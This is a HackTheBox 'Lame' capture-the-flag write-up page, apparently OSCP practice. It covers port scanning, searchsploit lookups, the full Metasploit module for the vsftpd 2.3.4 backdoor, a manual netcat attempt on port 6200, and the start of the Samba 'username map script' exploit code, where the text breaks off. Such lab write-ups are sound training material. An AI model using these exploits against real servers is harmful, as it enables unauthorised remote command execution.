@@ -1,0 +1,1024 @@
+<!DOCTYPE html><html lang="en"><head>
+    
+      <title>
+        [HackTheBox – Lame] (OSCP Like) English Writeup ::
+        jorgectf — blog
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta name="description" content="Lame OSCP Practice Writeup."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://jorgectf.gitlab.io/blog/post/lame-writeup-english/"/>
+
+
+
+
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/assets/style.css"/>
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/style.css"/>
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://jorgectf.gitlab.io/blog/img/apple-touch-icon-144-precomposed.png"/>
+<link rel="shortcut icon" href="https://jorgectf.gitlab.io/blog/img/favicon.png"/>
+
+
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[HackTheBox – Lame] (OSCP Like) English Writeup"/>
+<meta name="twitter:description" content="Lame OSCP Practice Writeup."/>
+
+
+
+<meta property="og:title" content="[HackTheBox – Lame] (OSCP Like) English Writeup"/>
+<meta property="og:description" content="Lame OSCP Practice Writeup."/>
+<meta property="og:type" content="article"/>
+<meta property="og:url" content="https://jorgectf.gitlab.io/blog/post/lame-writeup-english/"/><meta property="article:section" content="post"/>
+<meta property="article:published_time" content="2019-11-19T12:55:00+00:00"/>
+<meta property="article:modified_time" content="2019-11-19T12:55:00+00:00"/><meta property="og:site_name" content="jorgectf"/>
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+    
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+  </ul>
+</nav>
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"></path>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">[HackTheBox – Lame] (OSCP Like) English Writeup</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2019-11-19
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/hackthebox/">#HackTheBox</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/english/">#English</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/writeup/">#Writeup</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/oscp-practice/">#OSCP Practice</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/nmap/">#nmap</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/searchsploit/">#searchsploit</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/nc/">#nc</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/smb/">#smb</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/python/">#python</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/distcc/">#distcc</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/udev/">#udev</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/kexploit/">#kexploit</a> 
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      <p>This is the first writeup I’m doing in English, please, consider this is not my mother tongue, so take into account that errors could appear in this text, thanks!</p>
+<p>Following the OSCP Practice post I’ve made recently (will be posted soon), this is the first writeup for the serie.</p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/lame/logo.png" alt=""/></p>
+<h1 id="ratings">Ratings:</h1>
+<p><img src="https://jorgectf.gitlab.io/blog/static/lame/ratings.png" alt=""/></p>
+<h1 id="port-scan">Port scan:</h1>
+<pre tabindex="0"><code>$ nmap -sC -sV -Pn -n -p - -oN nmap.all --min-rate 2000 -v 10.10.10.3
+</code></pre><pre tabindex="0"><code>Nmap scan report for 10.10.10.3
+Host is up (0.084s latency).
+Not shown: 65530 filtered ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.X
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
+|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
+|_smb-security-mode: ERROR: Script execution failed (use -d to debug)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+</code></pre><h1 id="information-gathering">Information Gathering</h1>
+<p>FTP version seems outdated, let’s see if there’s any exploit for that version.</p>
+<p>We can use <strong>searchsploit</strong> to search for exploits in <a href="">Exploit-DB</a> like this:</p>
+<pre tabindex="0"><code>$ searchsploit vsftpd 2.3.4
+</code></pre><pre tabindex="0"><code>----------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                               |  Path
+                                                                             | (/usr/share/exploitdb/)
+----------------------------------------------------------------------------- ----------------------------------------
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                       | exploits/unix/remote/17491.rb
+----------------------------------------------------------------------------- ----------------------------------------
+</code></pre><p>For further research of this exploit, we can mirror it to browse through its code.</p>
+<pre tabindex="0"><code>$ searchsploit -m exploits/unix/remote/17491.rb
+</code></pre><h4 id="exploits-code">Exploit’s code:</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#75715e">##</span>
+<span style="color:#75715e"># $Id: vsftpd_234_backdoor.rb 13099 2011-07-05 05:20:47Z hdm $</span>
+<span style="color:#75715e">##</span>
+
+<span style="color:#75715e">##</span>
+<span style="color:#75715e"># This file is part of the Metasploit Framework and may be subject to</span>
+<span style="color:#75715e"># redistribution and commercial restrictions. Please see the Metasploit</span>
+<span style="color:#75715e"># Framework web site for more information on licensing and terms of use.</span>
+<span style="color:#75715e"># http://metasploit.com/framework/</span>
+<span style="color:#75715e">##</span>
+
+require <span style="color:#e6db74">&#39;msf/core&#39;</span>
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Metasploit3</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">Msf</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Exploit</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Remote</span>
+	<span style="color:#66d9ef">Rank</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">ExcellentRanking</span>
+
+	<span style="color:#66d9ef">include</span> <span style="color:#66d9ef">Msf</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Exploit</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Remote</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Tcp</span>
+
+	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">initialize</span>(info <span style="color:#f92672">=</span> {})
+		<span style="color:#66d9ef">super</span>(update_info(info,
+			<span style="color:#e6db74">&#39;Name&#39;</span>           <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;VSFTPD v2.3.4 Backdoor Command Execution&#39;</span>,
+			<span style="color:#e6db74">&#39;Description&#39;</span>    <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">%q{
+</span><span style="color:#e6db74">					This module exploits a malicious backdoor that was added to the	VSFTPD download
+</span><span style="color:#e6db74">					archive. This backdoor was introdcued into the vsftpd-2.3.4.tar.gz archive between
+</span><span style="color:#e6db74">					June 30th 2011 and July 1st 2011 according to the most recent information
+</span><span style="color:#e6db74">					available. This backdoor was removed on July 3rd 2011.
+</span><span style="color:#e6db74">			}</span>,
+			<span style="color:#e6db74">&#39;Author&#39;</span>         <span style="color:#f92672">=&gt;</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#39;hdm&#39;</span>, <span style="color:#e6db74">&#39;mc&#39;</span> <span style="color:#f92672">]</span>,
+			<span style="color:#e6db74">&#39;License&#39;</span>        <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">MSF_LICENSE</span>,
+			<span style="color:#e6db74">&#39;Version&#39;</span>        <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;$Revision: 13099 $&#39;</span>,
+			<span style="color:#e6db74">&#39;References&#39;</span>     <span style="color:#f92672">=&gt;</span>
+				<span style="color:#f92672">[</span>
+					<span style="color:#f92672">[</span> <span style="color:#e6db74">&#39;URL&#39;</span>, <span style="color:#e6db74">&#39;http://pastebin.com/AetT9sS5&#39;</span><span style="color:#f92672">]</span>,
+					<span style="color:#f92672">[</span> <span style="color:#e6db74">&#39;URL&#39;</span>, <span style="color:#e6db74">&#39;http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html&#39;</span> <span style="color:#f92672">]</span>,
+				<span style="color:#f92672">]</span>,
+			<span style="color:#e6db74">&#39;Privileged&#39;</span>     <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>,
+			<span style="color:#e6db74">&#39;Platform&#39;</span>       <span style="color:#f92672">=&gt;</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#39;unix&#39;</span> <span style="color:#f92672">]</span>,
+			<span style="color:#e6db74">&#39;Arch&#39;</span>           <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">ARCH_CMD</span>,
+			<span style="color:#e6db74">&#39;Payload&#39;</span>        <span style="color:#f92672">=&gt;</span>
+				{
+					<span style="color:#e6db74">&#39;Space&#39;</span>    <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">2000</span>,
+					<span style="color:#e6db74">&#39;BadChars&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;&#39;</span>,
+					<span style="color:#e6db74">&#39;DisableNops&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>,
+					<span style="color:#e6db74">&#39;Compat&#39;</span>      <span style="color:#f92672">=&gt;</span>
+						{
+							<span style="color:#e6db74">&#39;PayloadType&#39;</span>    <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;cmd_interact&#39;</span>,
+							<span style="color:#e6db74">&#39;ConnectionType&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;find&#39;</span>
+						}
+				},
+			<span style="color:#e6db74">&#39;Targets&#39;</span>        <span style="color:#f92672">=&gt;</span>
+				<span style="color:#f92672">[</span>
+					<span style="color:#f92672">[</span> <span style="color:#e6db74">&#39;Automatic&#39;</span>, { } <span style="color:#f92672">]</span>,
+				<span style="color:#f92672">]</span>,
+			<span style="color:#e6db74">&#39;DisclosureDate&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;Jul 3 2011&#39;</span>,
+			<span style="color:#e6db74">&#39;DefaultTarget&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>))
+
+		register_options(<span style="color:#f92672">[</span> <span style="color:#66d9ef">Opt</span><span style="color:#f92672">::</span><span style="color:#66d9ef">RPORT</span>(<span style="color:#ae81ff">21</span>) <span style="color:#f92672">]</span>, self<span style="color:#f92672">.</span>class)
+	<span style="color:#66d9ef">end</span>
+
+	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>
+
+		nsock <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>connect(<span style="color:#66d9ef">false</span>, {<span style="color:#e6db74">&#39;RPORT&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">6200</span>}) <span style="color:#66d9ef">rescue</span> <span style="color:#66d9ef">nil</span>
+		<span style="color:#66d9ef">if</span> nsock
+			print_status(<span style="color:#e6db74">&#34;The port used by the backdoor bind listener is already open&#34;</span>)
+			handle_backdoor(nsock)
+			<span style="color:#66d9ef">return</span>
+		<span style="color:#66d9ef">end</span>
+
+		<span style="color:#75715e"># Connect to the FTP service port first</span>
+		connect
+
+		banner <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>get_once(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">30</span>)<span style="color:#f92672">.</span>to_s
+		print_status(<span style="color:#e6db74">&#34;Banner: </span><span style="color:#e6db74">#{</span>banner<span style="color:#f92672">.</span>strip<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+
+		sock<span style="color:#f92672">.</span>put(<span style="color:#e6db74">&#34;USER </span><span style="color:#e6db74">#{</span>rand_text_alphanumeric(rand(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">:)</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
+		resp <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>get_once(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">30</span>)<span style="color:#f92672">.</span>to_s
+		print_status(<span style="color:#e6db74">&#34;USER: </span><span style="color:#e6db74">#{</span>resp<span style="color:#f92672">.</span>strip<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+
+		<span style="color:#66d9ef">if</span> resp <span style="color:#f92672">=~</span> <span style="color:#e6db74">/^530 /</span>
+			print_error(<span style="color:#e6db74">&#34;This server is configured for anonymous only and the backdoor code cannot be reached&#34;</span>)
+			disconnect
+			<span style="color:#66d9ef">return</span>
+		<span style="color:#66d9ef">end</span>
+
+		<span style="color:#66d9ef">if</span> resp <span style="color:#f92672">!~</span> <span style="color:#e6db74">/^331 /</span>
+			print_error(<span style="color:#e6db74">&#34;This server did not respond as expected: </span><span style="color:#e6db74">#{</span>resp<span style="color:#f92672">.</span>strip<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+			disconnect
+			<span style="color:#66d9ef">return</span>
+		<span style="color:#66d9ef">end</span>
+
+		sock<span style="color:#f92672">.</span>put(<span style="color:#e6db74">&#34;PASS </span><span style="color:#e6db74">#{</span>rand_text_alphanumeric(rand(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
+
+		<span style="color:#75715e"># Do not bother reading the response from password, just try the backdoor</span>
+		nsock <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>connect(<span style="color:#66d9ef">false</span>, {<span style="color:#e6db74">&#39;RPORT&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">6200</span>}) <span style="color:#66d9ef">rescue</span> <span style="color:#66d9ef">nil</span>
+		<span style="color:#66d9ef">if</span> nsock
+			print_good(<span style="color:#e6db74">&#34;Backdoor service has been spawned, handling...&#34;</span>)
+			handle_backdoor(nsock)
+			<span style="color:#66d9ef">return</span>
+		<span style="color:#66d9ef">end</span>
+
+		disconnect
+
+	<span style="color:#66d9ef">end</span>
+
+	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">handle_backdoor</span>(s)
+
+		s<span style="color:#f92672">.</span>put(<span style="color:#e6db74">&#34;id</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+
+		r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get_once(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">5</span>)<span style="color:#f92672">.</span>to_s
+		<span style="color:#66d9ef">if</span> r <span style="color:#f92672">!~</span> <span style="color:#e6db74">/uid=/</span>
+			print_error(<span style="color:#e6db74">&#34;The service on port 6200 does not appear to be a shell&#34;</span>)
+			disconnect(s)
+			<span style="color:#66d9ef">return</span>
+		<span style="color:#66d9ef">end</span>
+
+		print_good(<span style="color:#e6db74">&#34;UID: </span><span style="color:#e6db74">#{</span>r<span style="color:#f92672">.</span>strip<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+
+		s<span style="color:#f92672">.</span>put(<span style="color:#e6db74">&#34;nohup &#34;</span> <span style="color:#f92672">+</span> payload<span style="color:#f92672">.</span>encoded <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span>)
+		handler(s)
+	<span style="color:#66d9ef">end</span>
+
+<span style="color:#66d9ef">end</span>
+</code></pre></div><p>This exploit is a Metasploit module, so regarding OSCP’s MSF ‘ban’, we are not going to use it, but cool information can be extracted from there.</p>
+<p>From this exploit, we can see that it triggers a backdoor at the moment that a user is logged in with a smiley face :) in the user input.</p>
+<p>Let’s try manually.</p>
+<p>First of all, we connect to he ftp server:</p>
+<pre tabindex="0"><code>$ ftp 10.10.10.3
+</code></pre><p>Then, before introducing the password (having put a user with a smiley face ‘:)’ ), we open a nc socket connection, to try to connect and execute commands after introducing the password, but no response is given.</p>
+<pre tabindex="0"><code>$ nc 10.10.10.3 6200
+</code></pre><pre tabindex="0"><code>id\n
+
+&lt;-- no response --&gt;
+</code></pre><p>Let’s move on to other service, samba seems juicy.</p>
+<h1 id="first-way">First way</h1>
+<p>Even though ssh is before samba on the port list, it rarely has an outdated version or misconfiguration that can be exploited, but can be useful if nothing has been successfully exploited and it’s the only way to continue. Tools like patator or hydra could help for bruteforcing credentials.</p>
+<p>Nmap hasn’t worked on scanning samba’s config, but we haven’t tried discovery scripts yet.</p>
+<pre tabindex="0"><code>$ nmap -sV -sC -p 445 --script discovery 10.10.10.3 -v
+</code></pre><pre tabindex="0"><code>Nmap scan report for 10.10.10.3
+Host is up (0.056s latency).
+
+PORT    STATE SERVICE     VERSION
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
+
+Host script results:
+|_dns-brute: Can&#39;t guess domain of &#34;10.10.10.3&#34;; use dns-brute.domain script argument.
+|_fcrdns: FAIL (No PTR record)
+|_ipidseq: All zeros
+|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
+|_msrpc-enum: NT_STATUS_OBJECT_NAME_NOT_FOUND
+|_path-mtu: PMTU == 1500
+|_smb-enum-domains: ERROR: Script execution failed (use -d to debug)
+|_smb-enum-groups: ERROR: Script execution failed (use -d to debug)
+|_smb-enum-processes: ERROR: Script execution failed (use -d to debug)
+|_smb-enum-sessions: ERROR: Script execution failed (use -d to debug)
+|_smb-enum-shares: ERROR: Script execution failed (use -d to debug)
+|_smb-mbenum: ERROR: Script execution failed (use -d to debug)
+|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
+|_smb-protocols: ERROR: Script execution failed (use -d to debug)
+|_smb-security-mode: ERROR: Script execution failed (use -d to debug)
+|_smb-server-stats: ERROR: Script execution failed (use -d to debug)
+|_smb-system-info: ERROR: Script execution failed (use -d to debug)
+|_smb2-time: Protocol negotiation failed (SMB2)
+|_stuxnet-detect: ERROR: Script execution failed (use -d to debug)
+
+</code></pre><p>Definitely, nmap can’t scan samba’s config, so a little guessing or research has to be done.</p>
+<p>At least it tell us that it’s version is between 3.X and 4.X, it’s something.</p>
+<p>If we search for exploits:</p>
+<pre tabindex="0"><code>$ searchsploit samba 3
+</code></pre><pre tabindex="0"><code>----------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                               |  Path
+                                                                             | (/usr/share/exploitdb/)
+----------------------------------------------------------------------------- ----------------------------------------
+Microsoft Windows XP/2003 - Samba Share Resource Exhaustion (Denial of Servi | exploits/windows/dos/148.sh
+Samba 1.9.19 - &#39;Password&#39; Remote Buffer Overflow                             | exploits/linux/remote/20308.c
+Samba 2.0.7 - SWAT Logfile Permissions                                       | exploits/linux/local/20341.sh
+Samba 2.0.7 - SWAT Logging Failure                                           | exploits/unix/remote/20340.c
+Samba 2.0.7 - SWAT Symlink (1)                                               | exploits/linux/local/20338.c
+Samba 2.0.7 - SWAT Symlink (2)                                               | exploits/linux/local/20339.sh
+Samba 2.2.2 &lt; 2.2.6 - &#39;nttrans&#39; Remote Buffer Overflow (Metasploit) (1)      | exploits/linux/remote/16321.rb
+Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalat | exploits/linux/local/23674.txt
+Samba 2.2.8 (Solaris SPARC) - &#39;trans2open&#39; Remote Overflow (Metasploit)      | exploits/solaris_sparc/remote/16330.rb
+Samba 2.2.x - &#39;call_trans2open&#39; Remote Buffer Overflow (3)                   | exploits/unix/remote/22470.c
+Samba 2.2.x - &#39;nttrans&#39; Remote Overflow (Metasploit)                         | exploits/linux/remote/9936.rb
+Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow      | exploits/unix/remote/22356.c
+Samba 3.0.10 (OSX) - &#39;lsa_io_trans_names&#39; Heap Overflow (Metasploit)         | exploits/osx/remote/16875.rb
+Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass                       | exploits/multiple/remote/10095.txt
+Samba 3.0.20 &lt; 3.0.25rc3 - &#39;Username map script&#39; Command Execution (Metasp) | exploits/unix/remote/16320.rb
+Samba 3.0.21 &lt; 3.0.24 - LSA trans names Heap Overflow (Metasploit)           | exploits/linux/remote/9950.rb
+Samba 3.0.24 (Linux) - &#39;lsa_io_trans_names&#39; Heap Overflow (Metasploit)       | exploits/linux/remote/16859.rb
+Samba 3.0.24 (Solaris) - &#39;lsa_io_trans_names&#39; Heap Overflow (Metasploit)     | exploits/solaris/remote/16329.rb
+Samba 3.0.27a - &#39;send_mailslot()&#39; Remote Buffer Overflow                     | exploits/linux/dos/4732.c
+Samba 3.0.29 (Client) - &#39;receive_smb_raw()&#39; Buffer Overflow (PoC)            | exploits/multiple/dos/5712.pl
+Samba 3.0.4 - SWAT Authorisation Buffer Overflow                             | exploits/linux/remote/364.pl
+Samba 3.3.12 (Linux x86) - &#39;chain_reply&#39; Memory Corruption (Metasploit)      | exploits/linux_x86/remote/16860.rb
+Samba 3.3.5 - Format String / Security Bypass                                | exploits/linux/remote/33053.txt
+Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy AuditEventsInfo Heap Overfl | exploits/linux/remote/21850.rb
+Samba 3.4.5 - Symlink Directory Traversal                                    | exploits/linux/remote/33599.txt
+Samba 3.4.5 - Symlink Directory Traversal (Metasploit)                       | exploits/linux/remote/33598.rb
+Samba 3.4.7/3.5.1 - Denial of Service                                        | exploits/linux/dos/12588.txt
+Samba 3.5.0 - Remote Code Execution                                          | exploits/linux/remote/42060.py
+Samba 3.5.0 &lt; 4.4.14/4.5.10/4.6.4 - &#39;is_known_pipename()&#39; Arbitrary Module L | exploits/linux/remote/42084.rb
+Samba 3.5.11/3.6.3 - Remote Code Execution                                   | exploits/linux/remote/37834.py
+Samba 3.5.22/3.6.17/4.0.8 - nttrans Reply Integer Overflow                   | exploits/linux/dos/27778.txt
+Samba &lt; 3.0.20 - Remote Heap Overflow                                        | exploits/linux/remote/7701.txt
+Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                | exploits/linux_x86/dos/36741.py
+Sambar FTP Server 6.4 - &#39;SIZE&#39; Remote Denial of Service                      | exploits/windows/dos/2934.php
+Sambar Server 4.3/4.4 Beta 3 - Search CGI                                    | exploits/windows/remote/20223.txt
+Sambar Server 5.1 - Script Source Disclosure                                 | exploits/cgi/remote/21390.txt
+Sambar Server 5.x - Information Disclosure                                   | exploits/windows/remote/22434.txt
+Sambar Server 6.0 - &#39;results.stm&#39; POST Buffer Overflow                       | exploits/windows/dos/23664.py
+Sambar Server 6.1 Beta 2 - &#39;showini.asp&#39; Arbitrary File Access               | exploits/windows/remote/24163.txt
+----------------------------------------------------------------------------- ----------------------------------------
+</code></pre><p>Too much exploits are shown, but we can sort them. Taking into account that the box is rated an easy level, the first exploit will allow us to execute commands at least. The first that allow us to do so and belongs to the third version of samba is this one.</p>
+<pre tabindex="0"><code>Samba 3.0.20 &lt; 3.0.25rc3 - &#39;Username&#39; map script&#39; Command Execution (Metasploit)
+</code></pre><p>Mirroring it allow us to see its behaviour.</p>
+<h5 id="this-module-exploits-a-command-execution-vulerability-in-sambaversions-3020-through-3025rc3-when-using-the-non-default-username-map-script-configuration-option-by-specifying-a-username-containing-shell-meta-characters-attackers-can-execute-arbitrary-commands">“This module exploits a command execution vulerability in Sambaversions 3.0.20 through 3.0.25rc3 when using the non-default “username map script” configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands.”</h5>
+<h5 id="no-authentication-is-needed-to-exploit-this-vulnerability-since-this-option-is-used-to-map-usernames-prior-to-authentication">No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!</h5>
+<p>No authentication needed! More reasons for it to be our exploit ;)</p>
+<h5 id="exploit-code">Exploit code:</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;msf/core&#39;</span>
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Metasploit3</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">Msf</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Exploit</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Remote</span>
+	<span style="color:#66d9ef">Rank</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">ExcellentRanking</span>
+
+	<span style="color:#66d9ef">include</span> <span style="color:#66d9ef">Msf</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Exploit</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Remote</span><span style="color:#f92672">::</span><span style="color:#66d9ef">SMB</span>
+
+	<span style="color:#75715e"># For our customized version of session_setup_ntlmv1</span>
+	<span style="color:#66d9ef">CONST</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">Rex</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Proto</span><span style="color:#f92672">::</span><span style="color:#66d9ef">SMB</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Constants</span>
+	<span style="color:#66d9ef">CRYPT</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">Rex</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Proto</span><span style="color:#f92672">::</span><span style="color:#66d9ef">SMB</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Crypt</span>
+
+	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">initialize</span>(info <span style="color:#f92672">=</span> {})
